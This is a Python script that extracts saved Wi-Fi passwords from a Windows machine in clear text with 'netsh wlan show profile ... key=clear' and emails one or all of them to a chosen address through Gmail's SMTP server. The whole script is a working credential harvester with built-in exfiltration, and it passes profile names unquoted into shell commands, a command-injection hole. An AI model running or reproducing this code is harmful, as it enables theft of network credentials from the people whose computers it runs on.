import subprocess,smtplib,re 
import os

#------------------------------------------------
#Global variable
#------------------------------------------------

file_path = "wlan_profiles"

def get_arg():

      pattern = r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$'

      while True:
          senders_mail = input("Enter the senders Email_address: ")

          if not re.fullmatch(pattern,senders_mail):
              print()
              print("[-] Inavlid, enter a proper Senders email address")
              print()
          else:
              break

      while True:
          reciving_mail = input("Enter the Reciving Email_address: ")

          if not re.fullmatch(pattern,reciving_mail):
                        print()
                        print("[-] Inavlid, enter a proper Reciving email address")
                        print()
          else:
                break
      while True:
          app_password = input("Enter the app password: ")

          if not app_password:
              print()
              print("[-] Blank response. Kindly check how to get a app password")
              print()
          else:
              break

      return senders_mail,reciving_mail,app_password




def send_mail(Senders_mail,reciving_mail,password,message):
    server = smtplib.SMTP("smtp.gmail.com", 587) # smtp server with its port number
    server.starttls()
    server.login(Senders_mail,password)

    from email.mime.text import MIMEText
    msg = MIMEText(message,"plain","utf-8") #utf-8 the protocol on how we the encoding and decoding the message
    msg["Subject"]  = "Passowrd" # headers 
    msg["FROM"] = senders_mail
    msg["TO"] = reciving_mail 
    server.sendmail(Senders_mail,reciving_mail,msg.as_string()) # as msg is a mime object and we r sending it in the form of string 
    server.quit()

    print()
    print(f"[*] Mail has been sent to {reciving_mail}")
    print()



# calling the subprocess
def save_data():
   command = "netsh wlan show profiles"
   result = subprocess.check_output(command, shell=True).decode("utf-8")
   values = re.findall(r"(?:Profile\s*:\s)(.*)", result) 
   with open(file_path,"w")as f:
       for i in values:
          f.write(i)
   print("-" * 30)       
   print("[+] Data saved in file")
   print("-" * 30)

   with open(file_path,"r",errors="ignore")as q:
      result = q.readlines()
      list_of_profiles = []
      for i in result:
        list_of_profiles.append(i.strip())
       
   
   profiles = {}
   number = 1
   for i in list_of_profiles:
      profiles[number] = i
      number += 1

   return profiles
   

#function to show the profiles to the user to choose 

def Show_profiles(profiles):
   
    print("*" * 50)
    print("  Profiles avaliable in this computer")
    print("*" * 50)

    for number , profile in profiles.items():
        print(f"{number}    {profile}")

    choose_profile = " "
    choice = int(input("Enter the profile number: "))
    if choice in profiles:
        choose_profile = profiles[choice]
        print("*" * 50)
    else:
         print(f"[-] Invalid choice of: {choice}")
         exit(1)
    

    return choose_profile

#printing the details of the choosen profile
def print_choosen_profile_details(profile_name):
    command = f"netsh wlan show profile {profile_name} key=clear"

    result = subprocess.check_output(command, shell=True).decode("utf-8")


    password = re.search(r"(?:Content\s*:\s)(.*)", result)
    if not password:
        print(f"[-] No password found for this profile name: {profile_name}")
        exit(0)
    
    passs = f"Password for the profile {profile_name} is {password.group(1)}"
    return passs


def password_for_all_the_profiles(profiles):
    passwords_for_all = []

    for number , passs in profiles.items():
        passwords_for_all.append(passs)

    profile_password = {}
    for profile in passwords_for_all:
        command = f"netsh wlan show profile {profile} key=clear"
        try:
           result = subprocess.check_output(command,shell=True).decode("utf-8")
        except Exception as e:
            continue
        psd = re.search(r"(?:Content\s*:\s)(.*)", result)
        profile_password[profile] = psd.group(1) if psd else "Password not found"

    message = ""
    for profilee , passwordd in profile_password.items():
        message += f"{profilee} : {passwordd}\n"

    return message
        

senders_mail , reciving_mail , app_password = get_arg()    
profiles = save_data()

print("Do u want to scan a particular profile or everything?")
choice = input("choose 1 for 'particular profile' scan (1),  choose 2 for everything (2): ")

if choice == "1":
   profile_name = Show_profiles(profiles)
   password = print_choosen_profile_details(profile_name)
   send_mail(senders_mail,reciving_mail,app_password,password)
elif choice == "2":
    profile_password =password_for_all_the_profiles(profiles)
    send_mail(senders_mail,reciving_mail,app_password,profile_password)
